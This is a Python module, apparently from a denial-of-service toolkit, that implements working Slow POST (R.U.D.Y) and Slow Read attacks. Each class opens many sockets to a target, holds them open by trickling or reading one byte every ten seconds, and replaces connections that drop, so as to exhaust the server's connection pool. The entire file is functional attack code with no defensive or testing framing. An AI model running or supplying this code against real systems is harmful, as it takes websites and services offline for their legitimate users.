"""
Slow DDoS Attacks
Slow POST (R.U.D.Y), Slow Read
"""

import socket
import time
import random
import threading
from .base import AttackBase


class SlowPOST(AttackBase):
    """
    Slow POST Attack (R.U.D.Y - R-U-Dead-Yet)
    
    Send POST request with large Content-Length
    but send body very slowly (1 byte every few seconds)
    Exhausts server connection pool
    """
    
    def execute(self, duration: int, connections: int = 100, **kwargs) -> bool:
        """
        Execute Slow POST attack
        
        Args:
            duration: Attack duration in seconds
            connections: Number of slow connections
            
        Returns:
            True if successful
        """
        self.log('ATTACK', f'🔴 Starting SLOW POST (R.U.D.Y) on {self.target}:{self.port}')
        self.log('INFO', f'Duration: {duration}s | Connections: {connections}')
        
        sockets_list = []
        
        def create_slow_post():
            """Create slow POST connection"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target, self.port))
                
                # Send headers with large Content-Length
                content_length = 1000000  # 1MB
                request = f"POST /login HTTP/1.1\r\n"
                request += f"Host: {self.target}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Content-Type: application/x-www-form-urlencoded\r\n"
                request += f"Content-Length: {content_length}\r\n\r\n"
                
                sock.send(request.encode())
                return sock
            except:
                return None
        
        try:
            self.start()
            
            # Create connections
            self.log('INFO', f'Creating {connections} slow POST connections...')
            for _ in range(connections):
                sock = create_slow_post()
                if sock:
                    sockets_list.append(sock)
            
            self.log('INFO', f'Created {len(sockets_list)} connections. Sending slow body...')
            
            # Send body very slowly
            end_time = time.time() + duration
            while time.time() < end_time and not self.stop_flag:
                for sock in sockets_list[:]:
                    try:
                        # Send 1 byte of POST body
                        sock.send(b'A')
                        self.stats['bytes_sent'] += 1
                    except:
                        sockets_list.remove(sock)
                        # Replace dead connection
                        new_sock = create_slow_post()
                        if new_sock:
                            sockets_list.append(new_sock)
                
                self.log('DEBUG', f'Active connections: {len(sockets_list)}')
                time.sleep(10)  # Send 1 byte every 10 seconds
            
            # Close connections
            for sock in sockets_list:
                try:
                    sock.close()
                except:
                    pass
            
            self.stop()
            self.log('SUCCESS', f'✓ Slow POST completed ({len(sockets_list)} connections)')
            return True
            
        except Exception as e:
            self.log('ERROR', f'Slow POST failed: {str(e)}')
            self.stop()
            return False


class SlowRead(AttackBase):
    """
    Slow Read Attack
    
    Send normal HTTP request but read response very slowly
    Forces server to keep connection open
    """
    
    def execute(self, duration: int, connections: int = 100, **kwargs) -> bool:
        """
        Execute Slow Read attack
        
        Args:
            duration: Attack duration in seconds
            connections: Number of slow connections
            
        Returns:
            True if successful
        """
        self.log('ATTACK', f'🔴 Starting SLOW READ on {self.target}:{self.port}')
        self.log('INFO', f'Duration: {duration}s | Connections: {connections}')
        
        sockets_list = []
        
        def create_slow_read():
            """Create slow read connection"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target, self.port))
                
                # Send normal request
                request = f"GET / HTTP/1.1\r\n"
                request += f"Host: {self.target}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Accept: */*\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                return sock
            except:
                return None
        
        try:
            self.start()
            
            # Create connections
            self.log('INFO', f'Creating {connections} slow read connections...')
            for _ in range(connections):
                sock = create_slow_read()
                if sock:
                    sockets_list.append(sock)
            
            self.log('INFO', f'Created {len(sockets_list)} connections. Reading slowly...')
            
            # Read response very slowly
            end_time = time.time() + duration
            while time.time() < end_time and not self.stop_flag:
                for sock in sockets_list[:]:
                    try:
                        # Read only 1 byte
                        sock.recv(1)
                        self.stats['bytes_sent'] += 1
                    except:
                        sockets_list.remove(sock)
                        # Replace dead connection
                        new_sock = create_slow_read()
                        if new_sock:
                            sockets_list.append(new_sock)
                
                self.log('DEBUG', f'Active connections: {len(sockets_list)}')
                time.sleep(10)  # Read 1 byte every 10 seconds
            
            # Close connections
            for sock in sockets_list:
                try:
                    sock.close()
                except:
                    pass
            
            self.stop()
            self.log('SUCCESS', f'✓ Slow Read completed ({len(sockets_list)} connections)')
            return True
            
        except Exception as e:
            self.log('ERROR', f'Slow Read failed: {str(e)}')
            self.stop()
            return False
